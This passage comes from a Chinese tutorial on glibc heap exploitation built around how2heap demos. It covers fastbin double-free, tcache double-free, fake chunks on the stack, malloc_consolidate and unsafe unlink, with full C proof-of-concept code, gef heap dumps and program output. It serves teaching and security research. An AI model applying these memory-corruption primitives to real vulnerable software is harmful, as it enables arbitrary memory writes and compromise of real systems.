x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [be freed] 0x602010: 0x0000000000000000 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u7b2c\u4e8c\u4e2a free \u4e4b\u540e\uff0cchunk b \u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [be freed] 0x602010: 0x0000000000000000 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [be freed] 0x602030: 0x0000000000602000 0x0000000000000000 <-- fd pointer 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u6b64\u65f6\u7531\u4e8e chunk a \u5904\u4e8e bin \u4e2d\u7b2c 2 \u5757\u7684\u4f4d\u7f6e\uff0c\u4e0d\u4f1a\u88ab double-free \u7684\u68c0\u67e5\u673a\u5236\u68c0\u67e5\u51fa\u6765\u3002\u6240\u4ee5\u7b2c\u4e09\u4e2a free \u4e4b\u540e\uff0cchunk a \u518d\u6b21\u88ab\u6dfb\u52a0\u5230 fastbins \u4e2d\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [be freed again] 0x602010: 0x0000000000602020 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [be freed] 0x602030: 0x0000000000602000 0x0000000000000000 <-- fd pointer 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2192 [loop detected] \u6b64\u65f6 chunk a \u548c chunk b \u4f3c\u4e4e\u5f62\u6210\u4e86\u4e00\u4e2a\u73af\u3002 \u518d\u4e09\u4e2a malloc \u4e4b\u540e\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk d, chunk f 0x602010: 0x4646464646464646 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk e 0x602030: 0x4545454545454545 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 \u6240\u4ee5\u5bf9\u4e8e fastbins\uff0c\u53ef\u4ee5\u901a\u8fc7 double-free \u6cc4\u6f0f\u51fa\u4e00\u4e2a\u5806\u5757\u7684\u6307\u9488\u3002 \u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff1a $ gcc -fsanitize=address -g fastbin_dup.c $ ./a.out Allocating 3 buffers. 1st malloc(9) 0x60200000eff0 points to AAAAAAAA 2nd malloc(9) 0x60200000efd0 points to BBBBBBBB 3rd malloc(9) 0x60200000efb0 points to CCCCCCCC Freeing the first one 0x60200000eff0. Then freeing another one 0x60200000efd0. Freeing the first one 0x60200000eff0 again. ================================================================= ==5650==ERROR: AddressSanitizer: attempting double-free on 0x60200000eff0 in thread T0: #0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca) #1 0x400ba3 in main /home/firmy/how2heap/fastbin_dup.c:22 #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #3 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878) 0x60200000eff0 is located 0 bytes inside of 9-byte region [0x60200000eff0,0x60200000eff9) freed by thread T0 here: #0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca) #1 0x400b0d in main /home/firmy/how2heap/fastbin_dup.c:18 #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) previously allocated by thread T0 here: #0 0x7fdc18ebf602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602) #1 0x400997 in main /home/firmy/how2heap/fastbin_dup.c:7 #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) \u4e00\u4e2a\u5f88\u660e\u663e\u7684 double-free \u6f0f\u6d1e\u3002\u5173\u4e8e\u8fd9\u7c7b\u6f0f\u6d1e\u7684\u8be6\u7ec6\u5229\u7528\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u91cc\u518d\u8bb2\u3002 \u770b\u4e00\u70b9\u65b0\u9c9c\u7684\uff0c\u5728 libc-2.26 \u4e2d\uff0c\u5373\u4f7f\u4e24\u6b21 free\uff0c\u4e5f\u5e76\u6ca1\u6709\u89e6\u53d1 double-free \u7684\u5f02\u5e38\u68c0\u6d4b\uff0c\u8fd9\u4e0e tcache \u673a\u5236\u6709\u5173\uff0c\u4ee5\u540e\u4f1a\u8be6\u7ec6\u8bb2\u8ff0\u3002\u8fd9\u91cc\u5148\u770b\u4e2a\u80fd\u591f\u5728\u8be5\u7248\u672c\u4e0b\u89e6\u53d1 double-free \u7684\u4f8b\u5b50\uff1a #include <stdio.h> #include <stdlib.h> int main() { int i; void *p = malloc(0x40); fprintf(stderr, \"First allocate a fastbin: p=%p\\n\", p); fprintf(stderr, \"Then free(p) 7 times\\n\"); for (i = 0; i < 7; i++) { fprintf(stderr, \"free %d: %p => %p\\n\", i+1, &p, p); free(p); } fprintf(stderr, \"Then malloc 8 times at the same address\\n\"); int *a[10]; for (i = 0; i < 8; i++) { a[i] = malloc(0x40); fprintf(stderr, \"malloc %d: %p => %p\\n\", i+1, &a[i], a[i]); } fprintf(stderr, \"Finally trigger double-free\\n\"); for (i = 0; i < 2; i++) { fprintf(stderr, \"free %d: %p => %p\\n\", i+1, &a[i], a[i]); free(a[i]); } } $ gcc -g tcache_double-free.c $ ./a.out First allocate a fastbin: p=0x559e30950260 Then free(p) 7 times free 1: 0x7ffc498b2958 => 0x559e30950260 free 2: 0x7ffc498b2958 => 0x559e30950260 free 3: 0x7ffc498b2958 => 0x559e30950260 free 4: 0x7ffc498b2958 => 0x559e30950260 free 5: 0x7ffc498b2958 => 0x559e30950260 free 6: 0x7ffc498b2958 => 0x559e30950260 free 7: 0x7ffc498b2958 => 0x559e30950260 Then malloc 8 times at the same address malloc 1: 0x7ffc498b2960 => 0x559e30950260 malloc 2: 0x7ffc498b2968 => 0x559e30950260 malloc 3: 0x7ffc498b2970 => 0x559e30950260 malloc 4: 0x7ffc498b2978 => 0x559e30950260 malloc 5: 0x7ffc498b2980 => 0x559e30950260 malloc 6: 0x7ffc498b2988 => 0x559e30950260 malloc 7: 0x7ffc498b2990 => 0x559e30950260 malloc 8: 0x7ffc498b2998 => 0x559e30950260 Finally trigger double-free free 1: 0x7ffc498b2960 => 0x559e30950260 free 2: 0x7ffc498b2968 => 0x559e30950260 double free or corruption (fasttop) [2] 1244 abort (core dumped) ./a.out fastbin_dup_into_stack #include <stdio.h> #include <stdlib.h> #include <string.h> int main() { unsigned long long stack_var = 0x21; fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *a = malloc(9); char *b = malloc(9); char *c = malloc(9); strcpy(a, \"AAAAAAAA\"); strcpy(b, \"BBBBBBBB\"); strcpy(c, \"CCCCCCCC\"); fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a); fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b); fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c); fprintf(stderr, \"Freeing the first one %p.\\n\", a); free(a); fprintf(stderr, \"Then freeing another one %p.\\n\", b); free(b); fprintf(stderr, \"Freeing the first one %p again.\\n\", a); free(a); fprintf(stderr, \"Allocating 4 buffers.\\n\"); unsigned long long *d = malloc(9); *d = (unsigned long long) (((char*)&stack_var) - sizeof(d)); fprintf(stderr, \"4nd malloc(9) %p points to %p\\n\", d, &d); char *e = malloc(9); strcpy(e, \"EEEEEEEE\"); fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e); char *f = malloc(9); strcpy(f, \"FFFFFFFF\"); fprintf(stderr, \"6rd malloc(9) %p points to %s\\n\", f, f); char *g = malloc(9); strcpy(g, \"GGGGGGGG\"); fprintf(stderr, \"7th malloc(9) %p points to %s\\n\", g, g); } $ gcc -g fastbin_dup_into_stack.c $ ./a.out Allocating 3 buffers. 1st malloc(9) 0xcf2010 points to AAAAAAAA 2nd malloc(9) 0xcf2030 points to BBBBBBBB 3rd malloc(9) 0xcf2050 points to CCCCCCCC Freeing the first one 0xcf2010. Then freeing another one 0xcf2030. Freeing the first one 0xcf2010 again. Allocating 4 buffers. 4nd malloc(9) 0xcf2010 points to 0x7ffd1e0d48b0 5nd malloc(9) 0xcf2030 points to EEEEEEEE 6rd malloc(9) 0xcf2010 points to FFFFFFFF 7th malloc(9) 0x7ffd1e0d48b0 points to GGGGGGGG \u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u600e\u6837\u901a\u8fc7\u4fee\u6539 fd \u6307\u9488\uff0c\u5c06\u5176\u6307\u5411\u4e00\u4e2a\u4f2a\u9020\u7684 free chunk\uff0c\u5728\u4f2a\u9020\u7684\u5730\u5740\u5904 malloc \u51fa\u4e00\u4e2a chunk\u3002\u8be5\u7a0b\u5e8f\u5927\u90e8\u5206\u5185\u5bb9\u90fd\u548c\u4e0a\u4e00\u4e2a\u7a0b\u5e8f\u4e00\u6837\uff0c\u6f0f\u6d1e\u4e5f\u540c\u6837\u662f double-free\uff0c\u53ea\u6709\u7ed9 fd \u586b\u5145\u7684\u5185\u5bb9\u4e0d\u4e00\u6837\u3002 \u4e09\u4e2a malloc \u4e4b\u540e\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x602010: 0x4141414141414141 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 <-- top chunk 0x602070: 0x0000000000000000 \u4e09\u4e2a free \u4e4b\u540e\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk a [be freed twice] 0x602010: 0x0000000000602020 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [be freed] 0x602030: 0x0000000000602000 0x0000000000000000 <-- fd pointer 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2192 [loop detected] \u8fd9\u4e00\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u4e0d\u518d\u586b\u5145\u65e0\u610f\u4e49\u7684 \"DDDDDDDD\"\uff0c\u800c\u662f\u586b\u5145\u4e00\u4e2a\u5730\u5740\uff0c\u5373\u6808\u5730\u5740\u51cf\u53bb 0x8\uff0c\u4ece\u800c\u5728\u6808\u4e0a\u4f2a\u9020\u51fa\u4e00\u4e2a free \u7684 chunk\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u7684\u5730\u5740\uff09\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 stack_var \u88ab\u6211\u4eec\u8bbe\u7f6e\u4e3a 0x21 \uff08\u6216 0x20 \u90fd\u53ef\u4ee5\uff09\uff0c\u5176\u5b9e\u662f\u4e3a\u4e86\u5728\u6808\u5730\u5740\u51cf\u53bb 0x8 \u7684\u65f6\u5019\u4f5c\u4e3a fake chunk \u7684 size \u5b57\u6bb5\u3002 glibc \u5728\u6267\u884c\u5206\u914d\u64cd\u4f5c\u65f6\uff0c\u82e5\u5757\u7684\u5927\u5c0f\u7b26\u5408 fast bin\uff0c\u5219\u4f1a\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u5bfb\u627e\u5408\u9002\u7684\u5757\uff0c\u6b64\u65f6 glibc \u5c06\u6839\u636e\u5019\u9009\u5757\u7684 size \u5b57\u6bb5\u8ba1\u7b97\u51fa fastbin \u7d22\u5f15\uff0c\u7136\u540e\u4e0e\u5bf9\u5e94 bin \u5728 fastbin \u4e2d\u7684\u7d22\u5f15\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u4e8c\u8005\u4e0d\u5339\u914d\uff0c\u5219\u8bf4\u660e\u5757\u7684 size \u5b57\u6bb5\u906d\u5230\u7834\u574f\u3002\u6240\u4ee5\u9700\u8981 fake chunk \u7684 size \u5b57\u6bb5\u88ab\u8bbe\u7f6e\u4e3a\u6b63\u786e\u7684\u503c\u3002 /* offset 2 to use otherwise unindexable first 2 bins */ #define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ())) { idx = fastbin_index (nb); [...] if (victim != 0) { if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; [...] } [...] } } \u7b80\u5355\u5730\u8bf4\u5c31\u662f fake chunk \u7684 size \u4e0e double-free \u7684 chunk \u7684 size \u76f8\u540c\u5373\u53ef\u3002 gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk d 0x602010: 0x00007fffffffdc30 0x0000000000000000 <-- fd pointer 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk b [be freed] 0x602030: 0x0000000000602000 0x0000000000000000 <-- fd pointer 0x602040: 0x0000000000000000 0x0000000000000021 <-- chunk c 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 p &stack_var $4 = (unsigned long long *) 0x7fffffffdc38 gef\u27a4 x/5gx 0x7fffffffdc38-0x8 0x7fffffffdc30: 0x0000000000000000 0x0000000000000021 <-- fake chunk [seems to be freed] 0x7fffffffdc40: 0x0000000000602010 0x0000000000602010 <-- fd pointer 0x7fffffffdc50: 0x0000000000602030 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x7fffffffdc40, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602020, size=0x0, flags=) [incorrect fastbin_index] \u53ef\u4ee5\u770b\u5230\uff0c\u4f2a\u9020\u7684 chunk \u5df2\u7ecf\u7531\u6307\u9488\u94fe\u63a5\u5230 fastbins \u4e0a\u4e86\u3002\u4e4b\u540e malloc \u4e24\u6b21\uff0c\u5373\u53ef\u5c06\u4f2a\u9020\u7684 chunk \u79fb\u52a8\u5230\u94fe\u8868\u5934\u90e8\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4646464646464646 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 0x602030: 0x4545454545454545 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000021 0x602050: 0x4343434343434343 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000020fa1 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x7fffffffdc40, size=0x20, flags=PREV_INUSE) \u2190 Chunk(addr=0x602020, size=0x0, flags=) [incorrect fastbin_index] \u518d\u6b21 malloc\uff0c\u5373\u53ef\u5728 fake chunk \u5904\u5206\u914d\u5185\u5b58\uff1a gef\u27a4 x/5gx 0x7fffffffdc38-0x8 0x7fffffffdc30: 0x0000000000000000 0x0000000000000021 <-- fake chunk 0x7fffffffdc40: 0x4747474747474747 0x0000000000602000 0x7fffffffdc50: 0x0000000000602030 \u6240\u4ee5\u5bf9\u4e8e fastbins\uff0c\u53ef\u4ee5\u901a\u8fc7 double-free \u8986\u76d6 fastbins \u7684\u7ed3\u6784\uff0c\u6765\u83b7\u5f97\u4e00\u4e2a\u6307\u5411\u4efb\u610f\u5730\u5740\u7684\u6307\u9488\u3002 fastbin_dup_consolidate #include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> int main() { void *p1 = malloc(0x10); void *p2 = malloc(0x10); strcpy(p1, \"AAAAAAAA\"); strcpy(p2, \"BBBBBBBB\"); fprintf(stderr, \"Allocated two fastbins: p1=%p p2=%p\\n\", p1, p2); fprintf(stderr, \"Now free p1!\\n\"); free(p1); void *p3 = malloc(0x400); fprintf(stderr, \"Allocated large bin to trigger malloc_consolidate(): p3=%p\\n\", p3); fprintf(stderr, \"In malloc_consolidate(), p1 is moved to the unsorted bin.\\n\"); free(p1); fprintf(stderr, \"Trigger the double free vulnerability!\\n\"); fprintf(stderr, \"We can pass the check in malloc() since p1 is not fast top.\\n\"); void *p4 = malloc(0x10); strcpy(p4, \"CCCCCCC\"); void *p5 = malloc(0x10); strcpy(p5, \"DDDDDDDD\"); fprintf(stderr, \"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\\n\", p4, p5); } $ gcc -g fastbin_dup_consolidate.c $ ./a.out Allocated two fastbins: p1=0x17c4010 p2=0x17c4030 Now free p1! Allocated large bin to trigger malloc_consolidate(): p3=0x17c4050 In malloc_consolidate(), p1 is moved to the unsorted bin. Trigger the double free vulnerability! We can pass the check in malloc() since p1 is not fast top. Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x17c4010 0x17c4010 \u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u5229\u7528\u5728 large bin \u7684\u5206\u914d\u4e2d malloc_consolidate \u673a\u5236\u7ed5\u8fc7 fastbin \u5bf9 double free \u7684\u68c0\u67e5\uff0c\u8fd9\u4e2a\u68c0\u67e5\u5728 fastbin_dup \u4e2d\u5df2\u7ecf\u5c55\u793a\u8fc7\u4e86\uff0c\u53ea\u4e0d\u8fc7\u5b83\u5229\u7528\u7684\u662f\u5728\u4e24\u6b21 free \u4e2d\u95f4\u63d2\u5165\u4e00\u6b21\u5bf9\u5176\u5b83 chunk \u7684 free\u3002 \u9996\u5148\u5206\u914d\u4e24\u4e2a fast chunk\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 0x602010: 0x4141414141414141 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 <-- top chunk 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 \u91ca\u653e\u6389 p1\uff0c\u5219\u7a7a\u95f2 chunk \u52a0\u5165\u5230 fastbins \u4e2d\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 [be freed] 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000020fc1 <-- top chunk 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) \u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u6b21\u91ca\u653e p1\uff0c\u5fc5\u7136\u89e6\u53d1 double free \u5f02\u5e38\uff0c\u7136\u800c\uff0c\u5982\u679c\u6b64\u65f6\u5206\u914d\u4e00\u4e2a large chunk\uff0c\u6548\u679c\u5982\u4e0b\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 [be freed] 0x602010: 0x00007ffff7dd1b88 0x00007ffff7dd1b88 <-- fd, bk pointer 0x602020: 0x0000000000000020 0x0000000000000020 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000411 <-- chunk p3 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] 0x00 gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[1]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) [+] Found 1 chunks in 1 small non-empty bins. \u53ef\u4ee5\u770b\u5230 fastbins \u4e2d\u7684 chunk \u5df2\u7ecf\u4e0d\u89c1\u4e86\uff0c\u53cd\u800c\u51fa\u73b0\u5728\u4e86 small bins \u4e2d\uff0c\u5e76\u4e14 chunk p2 \u7684 prev_size \u548c size \u5b57\u6bb5\u90fd\u88ab\u4fee\u6539\u3002 \u770b\u4e00\u4e0b large chunk \u7684\u5206\u914d\u8fc7\u7a0b\uff1a /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { idx = largebin_index (nb); if (have_fastchunks (av)) malloc_consolidate (av); } \u5f53\u5206\u914d large chunk \u65f6\uff0c\u9996\u5148\u6839\u636e chunk \u7684\u5927\u5c0f\u83b7\u5f97\u5bf9\u5e94\u7684 large bin \u7684 index\uff0c\u63a5\u7740\u5224\u65ad\u5f53\u524d\u5206\u914d\u533a\u7684 fast bins \u4e2d\u662f\u5426\u5305\u542b chunk\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528 malloc_consolidate() \u51fd\u6570\u5408\u5e76 fast bins \u4e2d\u7684 chunk\uff0c\u5e76\u5c06\u8fd9\u4e9b\u7a7a\u95f2 chunk \u52a0\u5165 unsorted bin \u4e2d\u3002\u56e0\u4e3a\u8fd9\u91cc\u5206\u914d\u7684\u662f\u4e00\u4e2a large chunk\uff0c\u6240\u4ee5 unsorted bin \u4e2d\u7684 chunk \u6309\u7167\u5927\u5c0f\u88ab\u653e\u56de small bins \u6216 large bins \u4e2d\u3002 \u7531\u4e8e\u6b64\u65f6 p1 \u5df2\u7ecf\u4e0d\u5728 fastbins \u7684\u9876\u90e8\uff0c\u53ef\u4ee5\u518d\u6b21\u91ca\u653e p1\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 [double freed] 0x602010: 0x0000000000000000 0x00007ffff7dd1b88 0x602020: 0x0000000000000020 0x0000000000000020 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000411 <-- chunk p3 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] \u2190 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[1]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) [+] Found 1 chunks in 1 small non-empty bins. p1 \u88ab\u518d\u6b21\u653e\u5165 fastbins\uff0c\u4e8e\u662f p1 \u540c\u65f6\u5b58\u5728\u4e8e fabins \u548c small bins \u4e2d\u3002 \u7b2c\u4e00\u6b21 malloc\uff0cchunk \u5c06\u4ece fastbins \u4e2d\u53d6\u51fa\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p1 [be freed], chunk p4 0x602010: 0x0043434343434343 0x00007ffff7dd1b88 0x602020: 0x0000000000000020 0x0000000000000020 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000411 <-- chunk p3 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 gef\u27a4 heap bins fast [ Fastbins for arena 0x7ffff7dd1b20 ] Fastbins[idx=0, size=0x10] 0x00 gef\u27a4 heap bins small [ Small Bins for arena 'main_arena' ] [+] small_bins[1]: fw=0x602000, bk=0x602000 \u2192 Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE) [+] Found 1 chunks in 1 small non-empty bins. \u7b2c\u4e8c\u6b21 malloc\uff0cchunk \u4ece small bins \u4e2d\u53d6\u51fa\uff1a gef\u27a4 x/15gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk p4, chunk p5 0x602010: 0x4444444444444444 0x00007ffff7dd1b00 0x602020: 0x0000000000000020 0x0000000000000021 <-- chunk p2 0x602030: 0x4242424242424242 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000411 <-- chunk p3 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 chunk p4 \u548c p5 \u5728\u540c\u4e00\u4f4d\u7f6e\u3002 unsafe_unlink #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> uint64_t *chunk0_ptr; int main() { int malloc_size = 0x80; // not fastbins int header_size = 2; chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, \"The global chunk0_ptr is at %p, pointing to %p\\n\", &chunk0_ptr, chunk0_ptr); fprintf(stderr, \"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr); // pass this check: (P->fd->bk != P || P->bk->fd != P) == False chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3); chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, \"Fake chunk fd: %p\\n\", (void*) chunk0_ptr[2]); fprintf(stderr, \"Fake chunk bk: %p\\n\\n\", (void*) chunk0_ptr[3]); // pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False // chunk0_ptr[1] = 0x0; // or 0x8, 0x80 uint64_t *chunk1_hdr = chunk1_ptr - header_size; chunk1_hdr[0] = malloc_size; chunk1_hdr[1] &= ~1; // deal with tcache // int *a[10]; // int i; // for (i = 0; i < 7; i++) { // a[i] = malloc(0x80); // } // for (i = 0; i < 7; i++) { // free(a[i]); // } free(chunk1_ptr); char victim_string[9]; strcpy(victim_string, \"AAAAAAAA\"); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, \"Original value: %s\\n\", victim_string); chunk0_ptr[0] = 0x4242424242424242LL; fprintf(stderr, \"New Value: %s\\n\", victim_string); } $ gcc -g unsafe_unlink.c $ ./a.out The global chunk0_ptr is at 0x601070, pointing to 0x721010 The victim chunk we are going to corrupt is at 0x7210a0 Fake chunk fd: 0x601058 Fake chunk bk: 0x601060 Original value: AAAAAAAA New Value: BBBBBBBB \u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u600e\u6837\u5229\u7528 free \u6539\u5199\u5168\u5c40\u6307\u9488 chunk0_ptr \u8fbe\u5230\u4efb\u610f\u5185\u5b58\u5199\u7684\u76ee\u7684\uff0c\u5373 unsafe 